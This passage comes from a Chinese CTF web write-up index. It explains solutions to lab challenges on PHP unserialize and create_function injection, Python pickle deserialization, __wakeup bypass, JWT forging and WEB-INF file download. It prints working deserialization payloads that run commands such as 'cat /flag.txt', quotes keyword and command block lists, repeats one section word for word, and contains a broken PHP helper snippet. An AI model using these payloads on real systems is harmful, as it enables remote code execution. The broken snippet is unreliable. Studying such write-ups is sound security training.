<pre><code>a:3:{s:4:\"user\";s:22:\"\";s:8:\"function\";s:34:\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";}\n</code></pre> <p>\u968f\u540e\u518d\u8bfb\u53d6 <code>s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";</code></p> <p>\u968f\u540e\u5927\u62ec\u53f7\u95ed\u5408</p> <p>\u540e\u9762\u7684 <code>\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";}</code> \u503c\u4e22\u5f03</p> <p>\u8bfb\u53d6\u5230 <code>d0g3_f1ag.php</code> \u5185\u5bb9\u4e3a</p> <pre><code>&lt;?php\n$flag = 'flag in /d0g3_fllllllag';\n?&gt;\n</code></pre> <p>\u518d\u4f9d\u6cd5\u8bfb\u53d6 <code>/d0g3_fllllllag</code> \u5373\u53ef</p> <pre><code>_SESSION[user]=flagflagflagflagphpphp&amp;_SESSION[function]=;s:3:\"img\";s:20:\"L2QwZzNfZmxsbGxsbGFn\";s:1:\"f\";s:1:\"a\";}\n</code></pre> <p></p>"},{"location":"Web/Chapter12/12-5/","title":"Python Pickle \u53cd\u5e8f\u5217\u5316\u4e4b subprocess","text":""},{"location":"Web/Chapter12/12-5/#python-pickle-\u53cd\u5e8f\u5217\u5316\u4e4b-subprocess","title":"Python Pickle \u53cd\u5e8f\u5217\u5316\u4e4b subprocess","text":"<p>\u63d0\u793a\u4e86\u6e90\u7801\u5728 /src \u76ee\u5f55\uff0c\u76f4\u63a5\u8bbf\u95ee</p> <p></p> <pre><code>import builtins\nimport io\nimport sys\nimport uuid\nfrom flask import Flask, request,jsonify,session\nimport pickle\nimport base64\n\n\napp = Flask(__name__)\n\napp.config['SECRET_KEY'] = str(uuid.uuid4()).replace(\"-\", \"\")\n\n\nclass User:\n    def __init__(self, username, password, auth='ctfer'):\n        self.username = username\n        self.password = password\n        self.auth = auth\n\npassword = str(uuid.uuid4()).replace(\"-\", \"\")\nAdmin = User('admin', password,\"admin\")\n\n@app.route('/')\ndef index():\n    return \"Welcome to my application\"\n\n\n@app.route('/login', methods=['GET', 'POST'])\ndef post_login():\n    if request.method == 'POST':\n\n        username = request.form['username']\n        password = request.form['password']\n\n\n        if username == 'admin' :\n            if password == admin.password:\n                session['username'] = \"admin\"\n                return \"Welcome Admin\"\n            else:\n                return \"Invalid Credentials\"\n        else:\n            session['username'] = username\n\n\n    return '''\n        &lt;form method=\"post\"&gt;\n        &lt;!-- /src may help you&gt;\n            Username: &lt;input type=\"text\" name=\"username\"&gt;&lt;br&gt;\n            Password: &lt;input type=\"password\" name=\"password\"&gt;&lt;br&gt;\n            &lt;input type=\"submit\" value=\"Login\"&gt;\n        &lt;/form&gt;\n    '''\n\n\n@app.route('/ppicklee', methods=['POST'])\ndef ppicklee():\n    data = request.form['data']\n\n    sys.modules['os'] = \"not allowed\"\n    sys.modules['sys'] = \"not allowed\"\n    try:\n\n        pickle_data = base64.b64decode(data)\n        for i in {\"os\", \"system\", \"eval\", 'setstate', \"globals\", 'exec', '__builtins__', 'template', 'render', '\\\\',\n                 'compile', 'requests', 'exit',  'pickle',\"class\",\"mro\",\"flask\",\"sys\",\"base\",\"init\",\"config\",\"session\"}:\n            if i.encode() in pickle_data:\n                return i+\" waf !!!!!!!\"\n\n        pickle.loads(pickle_data)\n        return \"success pickle\"\n    except Exception as e:\n        return \"fail pickle\"\n\n\n@app.route('/admin', methods=['POST'])\ndef admin():\n    username = session['username']\n    if username != \"admin\":\n        return jsonify({\"message\": 'You are not admin!'})\n    return \"Welcome Admin\"\n\n\n@app.route('/src')\ndef src():\n    return  open(\"app.py\", \"r\",encoding=\"utf-8\").read()\n\nif __name__ == '__main__':\n    app.run(host='0.0.0.0', debug=False, port=5000)\n</code></pre> <ul> <li><code>/ppicklee</code> \u8def\u7531\u53ea\u652f\u6301 <code>POST</code> \u65b9\u6cd5\u3002</li> <li>\u4ece\u8868\u5355\u4e2d\u83b7\u53d6 <code>data</code> \u5b57\u6bb5\uff0c\u5e76\u8fdb\u884c Base64 \u89e3\u7801\u3002</li> <li>\u901a\u8fc7 <code>sys.modules</code> \u7981\u7528 <code>os</code> \u548c <code>sys</code> \u6a21\u5757\u3002</li> <li>\u68c0\u67e5\u53cd\u5e8f\u5217\u5316\u6570\u636e\u4e2d\u662f\u5426\u5305\u542b\u9ed1\u540d\u5355\u4e2d\u7684\u5173\u952e\u5b57\uff0c\u5982\u679c\u5305\u542b\u5219\u8fd4\u56de\u9519\u8bef\u4fe1\u606f\u3002</li> <li>\u5982\u679c\u6570\u636e\u901a\u8fc7\u68c0\u67e5\uff0c\u5219\u5c1d\u8bd5\u53cd\u5e8f\u5217\u5316\u6570\u636e\uff0c\u6210\u529f\u8fd4\u56de <code>success pickle</code>\uff0c\u5931\u8d25\u8fd4\u56de <code>fail pickle</code></li> </ul> <p>\u56e0\u4e3a\u9898\u76ee\u544a\u8bc9\u4e86\u6211\u4eec flag \u5728 /flag\u4e0b\uff0c\u4e14\u5176 src \u8def\u7531\u4f1a\u8bfb\u53d6\u6587\u4ef6 app.py \u5185\u5bb9\u5e76\u8f93\u51fa</p> <p>\u56e0\u4e3a\u7981\u7528\u4e86 os \u548c sys \u6a21\u5757\uff0c\u6240\u4ee5\u6211\u4eec\u4f7f\u7528\u53e6\u4e00\u4e2a\u6a21\u5757 subprocess \u6267\u884c\u7cfb\u7edf\u547d\u4ee4</p> <pre><code>import pickle\nimport base64\nimport subprocess\n\n# __reduce__ \u65b9\u6cd5: \u8fd9\u662f pickle \u6a21\u5757\u4e2d\u7684\u4e00\u4e2a\u7279\u6b8a\u65b9\u6cd5\uff0c\u7528\u4e8e\u5b9a\u4e49\u5bf9\u8c61\u5728\u5e8f\u5217\u5316\u65f6\u7684\u884c\u4e3a\uff0c\u5b83\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4\uff0c\u5305\u542b\u4e00\u4e2a\u53ef\u8c03\u7528\u5bf9\u8c61\uff08\u901a\u5e38\u662f\u51fd\u6570\uff09\u53ca\u5176\u53c2\u6570\n# subprocess.check_output: \u8fd9\u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u4e8e\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u5e76\u8fd4\u56de\u8f93\u51fa\nclass A():\n    def __reduce__(self):\n        return subprocess.check_output, ([\"cp\", \"/flag\", \"/app/app.py\"],)\n\n\na = A()\nb = pickle.dumps(a)\n\nprint(base64.b64encode(b))\n</code></pre> <p></p> <p>\u8bbf\u95ee src \u76ee\u5f55\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter12/12-6/","title":"Python Pickle \u53cd\u5e8f\u5217\u5316\u4e4b commands","text":""},{"location":"Web/Chapter12/12-6/#python-pickle-\u53cd\u5e8f\u5217\u5316\u4e4b-commands","title":"Python Pickle \u53cd\u5e8f\u5217\u5316\u4e4b commands","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u63d0\u793a</p> <p></p> <p>\u7f51\u9875\u592a\u591a\u4e86\uff0c\u7528\u811a\u672c\u53bb\u627e</p> <pre><code>import requests\n\nurl=\"http://30b74212-bc6f-465c-8b60-d9aeaa215b75.node4.buuoj.cn:81/shop?page=\"\n\nfor i in range(0,2000):\n    print(i)\n    r=requests.get( url + str(i) )\n    if 'lv6.png' in r.text:\n        print (i)\n        break\n</code></pre> <p></p> <p>\u627e\u5230\u540e\u8d2d\u4e70\u94b1\u4e0d\u591f\uff0c\u4fee\u6539\u524d\u7aef\u4ee3\u7801\u7684\u6298\u6263</p> <p></p> <p>\u8d2d\u4e70\u540e\u663e\u793a\u53ea\u80fd admin \u8bbf\u95ee</p> <p></p> <p>\u67e5\u770b Cookies \u53d1\u73b0\u6709 JWT</p> <p></p> <p>\u4f7f\u7528\u5de5\u5177\u7834\u89e3\u5bc6\u94a5</p> <p></p> <p>\u53bb\u5728\u7ebf\u7f51\u7ad9\u751f\u6210 admin \u7684 JWT</p> <p></p> <p>\u66ff\u6362\u6389\u5237\u65b0\u7f51\u9875</p> <p></p> <p>\u70b9\u51fb\u540e\u6ca1\u53cd\u5e94\uff0c\u67e5\u770b\u6e90\u4ee3\u7801\u6709\u538b\u7f29\u6587\u4ef6</p> <p></p> <p>\u4e0b\u8f7d\u540e\u62ff\u5230\u6e90\u7801</p> <pre><code>import tornado.web\nfrom sshop.base import BaseHandler\nimport pickle\nimport urllib\n\n\nclass AdminHandler(BaseHandler):\n    @tornado.web.authenticated\n    def get(self, *args, **kwargs):\n        if self.current_user == \"admin\":\n            return self.render('form.html', res='This is Black Technology!', member=0)\n        else:\n            return self.render('no_ass.html')\n\n    @tornado.web.authenticated\n    def post(self, *args, **kwargs):\n        try:\n            become = self.get_argument('become')\n            p = pickle.loads(urllib.unquote(become))\n            return self.render('form.html', res=p, member=1)\n        except:\n            return self.render('form.html', res='This is Black Technology!', member=0)\n</code></pre> <p>become \u53c2\u6570\u5b58\u5728 Pickle \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e</p> <pre><code>import pickle\nimport urllib\nimport commands\n\n# commands.getoutput \u662f\u4e00\u4e2a\u51fd\u6570\uff0c\u7528\u4e8e\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u5e76\u8fd4\u56de\u8f93\u51fa\nclass Try(object):\n    def __reduce__(self):\n        return (commands.getoutput, ('cat /flag.txt',))\n\n\na = Try()\nprint(urllib.quote(pickle.dumps(a)))\n</code></pre> <p>\u66ff\u6362\u4e3a\u811a\u672c\u751f\u6210\u7684\u5e8f\u5217\u5316\u4ee3\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter12/12-7/","title":"PHP Create_function() \u53cd\u5e8f\u5217\u5316","text":""},{"location":"Web/Chapter12/12-7/#php-create_function-\u53cd\u5e8f\u5217\u5316","title":"PHP Create_function() \u53cd\u5e8f\u5217\u5316","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u6e90\u7801</p> <pre><code>&lt;?php\n\nif (isset($_GET['p'])) {\n    $p = unserialize($_GET['p']);\n}\nshow_source(\"index.php\");\n\nclass Noteasy\n{\n    private $a;\n    private $b;\n\n    // \u6784\u9020\u51fd\u6570\uff0c\u4f1a\u5728\u7c7b\u7684\u5bf9\u8c61\u5728\u521b\u5efa\u65f6\u81ea\u52a8\u8c03\u7528\n    public function __construct($a, $b)\n    {\n        $this-&gt;a = $a;\n        $this-&gt;b = $b;\n        $this-&gt;check($a.$b);\n        eval($a.$b);\n    }\n\n\n    // \u6790\u6784\u51fd\u6570\uff0c\u5728\u5bf9\u8c61\u9500\u6bc1\u65f6\u81ea\u52a8\u8c03\u7528\n    public function __destruct()\n    {\n        $a = (string)$this-&gt;a;\n        $b = (string)$this-&gt;b;\n        $this-&gt;check($a.$b);\n        $a(\"\", $b);\n    }\n\n\n    private function check($str)\n    {\n        if (preg_match_all(\"(ls|find|cat|grep|head|tail|echo)\", $str) &gt; 0) die(\"You are a hacker, get out\");\n    }\n\n\n    public function setAB($a, $b)\n    {\n        $this-&gt;a = $a;\n        $this-&gt;b = $b;\n    }\n}\n</code></pre> <p>\u9996\u5148\uff0c\u53cd\u5e8f\u5217\u5316\u4e0d\u8c03\u7528\u6784\u9020\u51fd\u6570</p> <p>\u56e0\u4e3a\u53cd\u5e8f\u5217\u5316\u65f6\u901a\u8fc7\u8bfb\u53d6\u5bf9\u8c61\u7684\u5b57\u8282\u6d41\u6765\u6062\u590d\u5bf9\u8c61\u7684\u72b6\u6001\uff0c\u800c\u4e0d\u662f\u901a\u8fc7\u8c03\u7528\u5bf9\u8c61\u7684\u6784\u9020\u51fd\u6570\u6765\u521b\u5efa\u5bf9\u8c61</p> <p>\u6240\u4ee5\u76f4\u63a5\u6765\u770b\u6790\u6784\u51fd\u6570</p> <pre><code>public function __destruct()\n{\n    // \u5c06\u5c5e\u6027 $a \u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\n    $a = (string)$this-&gt;a;\n\n    // \u5c06\u5c5e\u6027 $b \u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\n    $b = (string)$this-&gt;b;\n\n    // \u8c03\u7528 check \u65b9\u6cd5\uff0c\u4f20\u5165 $a \u548c $b \u8fde\u63a5\u540e\u7684\u5b57\u7b26\u4e32\n    $this-&gt;check($a.$b);\n\n    // \u91cd\u70b9\u4ee3\u7801\n    // \u5c06 $a \u4f5c\u4e3a\u51fd\u6570\u8c03\u7528\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a $b\n    $a(\"\", $b);\n}\n</code></pre> <p>\u4f46\u662f\u7a7a\u7684\u7684\u51fd\u6570\u4e0d\u80fd\u6267\u884c\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u6784\u9020\u4e00\u4e2a</p> <p>\u8fd9\u91cc\u8981\u5229\u7528 <code>Create_function()</code> \u51fd\u6570</p> <pre><code>$func = create_function('$a, $b', 'return $a + $b;');\necho $func(2, 3); // \u8f93\u51fa 5\n</code></pre> <p><code>create_function</code> \u5b9e\u9645\u4e0a\u4f1a\u5728\u5185\u90e8\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a</p> <ol> <li>\u751f\u6210\u4e00\u4e2a\u552f\u4e00\u7684\u51fd\u6570\u540d(\u5982 <code>__lambda_func</code>)</li> <li>\u7528\u7ed9\u5b9a\u7684\u53c2\u6570\u548c\u4ee3\u7801\u4f53\u521b\u5efa\u4e00\u4e2a\u65b0\u51fd\u6570</li> <li>\u8fd4\u56de\u8fd9\u4e2a\u51fd\u6570\u540d\u4ee5\u4fbf\u540e\u7eed\u8c03\u7528</li> </ol> <p>\u6784\u9020\u5e8f\u5217\u5316\u4ee3\u7801</p> <pre><code>&lt;?php\n\nClass Noteast{\n\nPrivate $a;\n\nPrivate $b;\n\nPublic function_construct($a,$b){\n\n$this-&gt;a=$a;\n\n$this-&gt;b=$b;\n\n}\n\n$object=new Noteasy(\"create_function\",';}highlight_file(\"/flag\");/*;');\n\nEcho serialize($object);\n\n}\n</code></pre> <p>\u8fd9\u6837\u76f8\u5f53\u4e8e</p> <pre><code>create_function('', ';}highlight_file(\"/flag\");/*;')\n</code></pre> <p>\u5b9e\u9645\u521b\u5efa\u7684\u4ee3\u7801\u4e3a</p> <pre><code>function __lambda_func() {\n    ;}highlight_file(\"/flag\");/*;\n}\n</code></pre> <p>\u5f97\u5230</p> <pre><code>O:7:\"Noteasy\":2:{s:10:\"Noteasya\";s:15:\"create_function\";s:10:\"Noteasyb\";s:21:';}highlight_file(\"/flag\");/*;\";}\n</code></pre> <p>\u9700\u8981\u6ce8\u610f\u56e0\u4e3a\u662f <code>private</code> \u5c5e\u6027\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528</p> <p>\u5e94\u8be5\u4e3a <code>\\00\u7c7b\u540d\\00</code></p> <pre><code>O:7:\"Noteasy\":2:{s:10:\"\\00Noteasy\\00a\";s:15:\"create_function\";s:10:\"\\00Noteasy\\00b\";s:29:\";}highlight_file(\"/flag\");/*\";}\n</code></pre> <p></p>"},{"location":"Web/Chapter12/12-8/","title":"PHP %00 \u7ed5\u8fc7 Private","text":""},{"location":"Web/Chapter12/12-8/#php-00-\u7ed5\u8fc7-private","title":"PHP %00 \u7ed5\u8fc7 Private","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u5907\u4efd\u63d0\u793a</p> <p></p> <p>\u626b\u540e\u53f0\u53d1\u73b0 ZIP \u6587\u4ef6</p> <p></p> <p>\u4e0b\u8f7d\u4e0b\u6765\u6253\u5f00 index.php \u62ff\u5230\u6e90\u7801\uff08flag.php \u662f\u5047\u7684\uff09</p> <p></p> <p>\u770b\u5230\u4e86\u53cd\u5e8f\u5217\u5316\uff0c\u63a5\u4e0b\u6765\u53bb\u770b class.php</p> <pre><code>__wakeup \u9b54\u672f\u65b9\u6cd5\uff1a\u5f53\u5bf9\u8c61\u53cd\u5e8f\u5217\u5316\u65f6\uff0c\u4f1a\u89e6\u53d1\u8be5\u65b9\u6cd5\u7ec8\u6b62\u811a\u672c\u6267\u884c\n\n__destruct \u6790\u6784\u51fd\u6570\uff1a\u5f53\u5bf9\u8c61\u9500\u6bc1\u65f6\u8c03\u7528\n</code></pre> <pre><code>&lt;?php\ninclude 'flag.php';\n\n\nerror_reporting(0);\n\n\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this-&gt;username = $username;\n        $this-&gt;password = $password;\n    }\n\n    function __wakeup(){\n        $this-&gt;username = 'guest';\n    }\n\n    function __destruct(){\n        if ($this-&gt;password != 100) {\n            echo \"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\";\n            echo \"You name is: \";\n            echo $this-&gt;username;echo \"&lt;/br&gt;\";\n            echo \"You password is: \";\n            echo $this-&gt;password;echo \"&lt;/br&gt;\";\n            die();\n        }\n        if ($this-&gt;username === 'admin') {\n            global $flag;\n            echo $flag;\n        }else{\n            echo \"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\";\n            die();\n\n\n        }\n    }\n}\n?&gt;\n</code></pre> <p>\u6211\u4eec\u9700\u8981\u4f20\u5165 username = admin\uff0cpassword = 100\uff0c\u4e8e\u662f\u6784\u9020\u53cd\u5e8f\u5217\u5316</p> <pre><code>&lt;?php\n\nclass Name{\n    private $username = 'nonono';\n    private $password = 'yesyes';\n\n    public function __construct($username,$password){\n        $this-&gt;username = $username;\n        $this-&gt;password = $password;\n    }\n}\n$a = new Name('admin', 100);\nvar_dump(serialize($a));\n\n?&gt;\n</code></pre> <p>\u8fd8\u6ca1\u6709\u7ed3\u675f\uff0c\u56e0\u4e3a\u7c7b\u7684\u4e24\u4e2a\u5c5e\u6027\u58f0\u660e\u4e3a private\uff0c\u53ea\u5728\u6240\u58f0\u660e\u7684\u7c7b\u4e2d\u53ef\u89c1\uff0c\u5728\u8be5\u7c7b\u7684\u5b50\u7c7b\u548c\u8be5\u7c7b\u7684\u5bf9\u8c61\u5b9e\u4f8b\u4e2d\u5747\u4e0d\u53ef\u89c1</p> <p>\u6240\u4ee5\u8981\u5728\u6b64\u57fa\u7840\u4e0a\u8865\u4e0a <code>%00</code></p> <pre><code>%00Name%00\n\n%00Name%00\n</code></pre> <p>\u6700\u540e\u662f\u7ed5\u8fc7 __wakeup()</p> <p>\u5f53\u53cd\u5e8f\u5217\u5316\u4e2d\u5bf9\u8c61\u5c5e\u6027\u7684\u4e2a\u6570\u548c\u771f\u5b9e\u7684\u4e2a\u6570\u4e0d\u7b49\u65f6\uff0c__wakeup() \u5c31\u4f1a\u88ab\u7ed5\u8fc7\uff0c\u6240\u4ee5\u4fee\u6539\u4f7f\u5176\u4e0d\u76f8\u7b49\u5373\u53ef</p> <pre><code>?select=O:4:\"Name\":3:{s:14:\"%00Name%00username\";s:5:\"admin\";s:14:\"%00Name%00password\";i:100;}\n</code></pre> <p></p>"},{"location":"Web/Chapter12/12-9/","title":"PHP \\00 \u7ed5\u8fc7 Private","text":""},{"location":"Web/Chapter12/12-9/#php-00-\u7ed5\u8fc7-private","title":"PHP \\00 \u7ed5\u8fc7 Private","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u6e90\u7801</p> <pre><code>&lt;?php\n\nif (isset($_GET['p'])) {\n    $p = unserialize($_GET['p']);\n}\nshow_source(\"index.php\");\n\nclass Noteasy\n{\n    private $a;\n    private $b;\n\n    // \u6784\u9020\u51fd\u6570\uff0c\u4f1a\u5728\u7c7b\u7684\u5bf9\u8c61\u5728\u521b\u5efa\u65f6\u81ea\u52a8\u8c03\u7528\n    public function __construct($a, $b)\n    {\n        $this-&gt;a = $a;\n        $this-&gt;b = $b;\n        $this-&gt;check($a.$b);\n        eval($a.$b);\n    }\n\n\n    // \u6790\u6784\u51fd\u6570\uff0c\u5728\u5bf9\u8c61\u9500\u6bc1\u65f6\u81ea\u52a8\u8c03\u7528\n    public function __destruct()\n    {\n        $a = (string)$this-&gt;a;\n        $b = (string)$this-&gt;b;\n        $this-&gt;check($a.$b);\n        $a(\"\", $b);\n    }\n\n\n    private function check($str)\n    {\n        if (preg_match_all(\"(ls|find|cat|grep|head|tail|echo)\", $str) &gt; 0) die(\"You are a hacker, get out\");\n    }\n\n\n    public function setAB($a, $b)\n    {\n        $this-&gt;a = $a;\n        $this-&gt;b = $b;\n    }\n}\n</code></pre> <p>\u9996\u5148\uff0c\u53cd\u5e8f\u5217\u5316\u4e0d\u8c03\u7528\u6784\u9020\u51fd\u6570</p> <p>\u56e0\u4e3a\u53cd\u5e8f\u5217\u5316\u65f6\u901a\u8fc7\u8bfb\u53d6\u5bf9\u8c61\u7684\u5b57\u8282\u6d41\u6765\u6062\u590d\u5bf9\u8c61\u7684\u72b6\u6001\uff0c\u800c\u4e0d\u662f\u901a\u8fc7\u8c03\u7528\u5bf9\u8c61\u7684\u6784\u9020\u51fd\u6570\u6765\u521b\u5efa\u5bf9\u8c61</p> <p>\u6240\u4ee5\u76f4\u63a5\u6765\u770b\u6790\u6784\u51fd\u6570</p> <pre><code>public function __destruct()\n{\n    // \u5c06\u5c5e\u6027 $a \u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\n    $a = (string)$this-&gt;a;\n\n    // \u5c06\u5c5e\u6027 $b \u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\n    $b = (string)$this-&gt;b;\n\n    // \u8c03\u7528 check \u65b9\u6cd5\uff0c\u4f20\u5165 $a \u548c $b \u8fde\u63a5\u540e\u7684\u5b57\u7b26\u4e32\n    $this-&gt;check($a.$b);\n\n    // \u91cd\u70b9\u4ee3\u7801\n    // \u5c06 $a \u4f5c\u4e3a\u51fd\u6570\u8c03\u7528\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4e3a $b\n    $a(\"\", $b);\n}\n</code></pre> <p>\u4f46\u662f\u7a7a\u7684\u7684\u51fd\u6570\u4e0d\u80fd\u6267\u884c\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u6784\u9020\u4e00\u4e2a</p> <p>\u8fd9\u91cc\u8981\u5229\u7528 <code>Create_function()</code> \u51fd\u6570</p> <pre><code>$func = create_function('$a, $b', 'return $a + $b;');\necho $func(2, 3); // \u8f93\u51fa 5\n</code></pre> <p><code>create_function</code> \u5b9e\u9645\u4e0a\u4f1a\u5728\u5185\u90e8\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a</p> <ol> <li>\u751f\u6210\u4e00\u4e2a\u552f\u4e00\u7684\u51fd\u6570\u540d(\u5982 <code>__lambda_func</code>)</li> <li>\u7528\u7ed9\u5b9a\u7684\u53c2\u6570\u548c\u4ee3\u7801\u4f53\u521b\u5efa\u4e00\u4e2a\u65b0\u51fd\u6570</li> <li>\u8fd4\u56de\u8fd9\u4e2a\u51fd\u6570\u540d\u4ee5\u4fbf\u540e\u7eed\u8c03\u7528</li> </ol> <p>\u6784\u9020\u5e8f\u5217\u5316\u4ee3\u7801</p> <pre><code>&lt;?php\n\nClass Noteast{\n\nPrivate $a;\n\nPrivate $b;\n\nPublic function_construct($a,$b){\n\n$this-&gt;a=$a;\n\n$this-&gt;b=$b;\n\n}\n\n$object=new Noteasy(\"create_function\",';}highlight_file(\"/flag\");/*;');\n\nEcho serialize($object);\n\n}\n</code></pre> <p>\u8fd9\u6837\u76f8\u5f53\u4e8e</p> <pre><code>create_function('', ';}highlight_file(\"/flag\");/*;')\n</code></pre> <p>\u5b9e\u9645\u521b\u5efa\u7684\u4ee3\u7801\u4e3a</p> <pre><code>function __lambda_func() {\n    ;}highlight_file(\"/flag\");/*;\n}\n</code></pre> <p>\u5f97\u5230</p> <pre><code>O:7:\"Noteasy\":2:{s:10:\"Noteasya\";s:15:\"create_function\";s:10:\"Noteasyb\";s:21:';}highlight_file(\"/flag\");/*;\";}\n</code></pre> <p>\u9700\u8981\u6ce8\u610f\u56e0\u4e3a\u662f <code>private</code> \u5c5e\u6027\uff0c\u6240\u4ee5\u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528</p> <p>\u5e94\u8be5\u4e3a <code>\\00\u7c7b\u540d\\00</code></p> <pre><code>O:7:\"Noteasy\":2:{s:10:\"\\00Noteasy\\00a\";s:15:\"create_function\";s:10:\"\\00Noteasy\\00b\";s:29:\";}highlight_file(\"/flag\");/*\";}\n</code></pre> <p></p>"},{"location":"Web/Chapter13/13-1/","title":"\u73af\u5883\u914d\u7f6e\u6cc4\u9732","text":""},{"location":"Web/Chapter13/13-1/#\u73af\u5883\u914d\u7f6e\u6cc4\u9732","title":"\u73af\u5883\u914d\u7f6e\u6cc4\u9732","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u4e09\u4e2a\u6587\u4ef6</p> <p></p> <p>flag.txt \u7ed9\u51fa\u4e86 flag \u6587\u4ef6\u6240\u5728\u4f4d\u7f6e</p> <p></p> <p>\u540c\u65f6\u6ce8\u610f\u5230 URL \u7684\u53c2\u6570\u6709\u4e00\u4e2a filehash</p> <p></p> <p>\u518d\u770b hints.txt \u6587\u4ef6\u7ed9\u51fa\u4e86\u4e00\u4e2a\u52a0\u5bc6\u65b9\u6cd5\uff0c\u5e94\u8be5\u5c31\u662f filehash \u7684</p> <p></p> <p>\u5982\u679c\u5220\u6389 filehash \u53c2\u6570\u8fd4\u56de\u62a5\u9519\u9875\u9762\uff0c\u4f46\u662f\u6ce8\u610f\u5230 msg = Error \u4e0e\u9875\u9762\u4e00\u81f4</p> <p></p> <p>\u4fee\u6539\u53c2\u6570\u503c\u9875\u9762\u4e5f\u968f\u4e4b\u53d8\u5316\uff0c\u63a8\u6d4b\u51fa\u5b58\u5728\u6a21\u677f\u6ce8\u5165</p> <p></p> <p>\u5728\u8fd9\u4e2a\u9875\u9762\u76f4\u63a5\u8bbf\u95ee\u73af\u5883\u914d\u7f6e\u4fe1\u606f</p> <p>\u5728 Tornado \u6846\u67b6\u4e2d\uff0chandler.settings \u4fdd\u5b58\u4e86 tornado \u6a21\u677f\u5185\u7f6e\u7684\u73af\u5883\u914d\u7f6e\u4fe1\u606f</p> <p></p> <p>\u6309\u7167 hints.txt \u8fdb\u884c\u52a0\u5bc6</p> <p></p> <p>\u4fee\u6539 filename \u4e0e filehash \u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter14/14-1/","title":"Java Web \u6cc4\u9732","text":""},{"location":"Web/Chapter14/14-1/#java-web-\u6cc4\u9732","title":"Java Web \u6cc4\u9732","text":"<p>\u6253\u5f00\u662f\u4e00\u4e2a\u767b\u5f55\u754c\u9762\uff0c\u4e0b\u9762\u6709\u4e00\u4e2a help</p> <p></p> <p>\u8bbf\u95ee\u786e\u5b9e\u662f\u57fa\u4e8e Java Web \u7684\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u6f0f\u6d1e\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053 flag \u5728\u54ea</p> <p></p> <p>\u4f7f\u7528 HackBar \u53d1\u73b0 GET \u4e0b\u8f7d\u4e0d\u4e86\u6587\u4ef6\uff0c\u8981 POST \u624d\u884c</p> <p></p> <p>WEB-INF \u662f JAVA \u7684 Web \u5e94\u7528\u7684\u5b89\u5168\u76ee\u5f55</p> <pre><code>/WEB-INF/web.xml\uff1aWeb\u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u6587\u4ef6\n\n/WEB-INF/classes/\uff1a\u542b\u4e86\u7ad9\u70b9\u6240\u6709\u7528\u7684 class \u6587\u4ef6\n\n/WEB-INF/lib/\uff1a\u5b58\u653e Web \u5e94\u7528\u9700\u8981\u7684\u5404\u79cd JAR \u6587\u4ef6\n\n/WEB-INF/src/\uff1a\u6e90\u7801\u76ee\u5f55\n\n/WEB-INF/database.properties\uff1a\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\n</code></pre> <p>\u6309\u7167\u987a\u5e8f\u5148\u4e0b\u8f7d web.xml</p> <p></p> <p>\u4e0b\u8f7d\u540e\u770b\u5230\u6709 com.wm.ctf.FlagController</p> <p></p> <p>\u53bb\u4e0b\u8f7d\u8fd9\u4e2a class \u6587\u4ef6</p> <p></p> <p>\u770b\u5230 Base64 \u7f16\u7801</p> <p></p> <p>\u89e3\u7801\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter15/15-1/","title":"file \u4f2a\u534f\u8bae\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6","text":""},{"location":"Web/Chapter15/15-1/#file-\u4f2a\u534f\u8bae\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6","title":"file \u4f2a\u534f\u8bae\u8bfb\u53d6\u4efb\u610f\u6587\u4ef6","text":"<p>\u6253\u5f00\u7f51\u9875\u6709\u767b\u5f55\u6709\u6ce8\u518c</p> <p></p> <p>\u8bbf\u95ee robots.txt \u53d1\u73b0\u6709\u4e2a\u4e0d\u53ef\u8bbf\u95ee\u6587\u4ef6</p> <p></p> <p>\u4e0b\u8f7d\u4e0b\u6765\u62ff\u5230\u6e90\u7801</p> <pre><code>&lt;?php\n\n\nclass UserInfo\n{\n    public $name = \"\";\n    public $age = 0;\n    public $blog = \"\";\n\n    public function __construct($name, $age, $blog)\n    {\n        $this-&gt;name = $name;\n        $this-&gt;age = (int)$age;\n        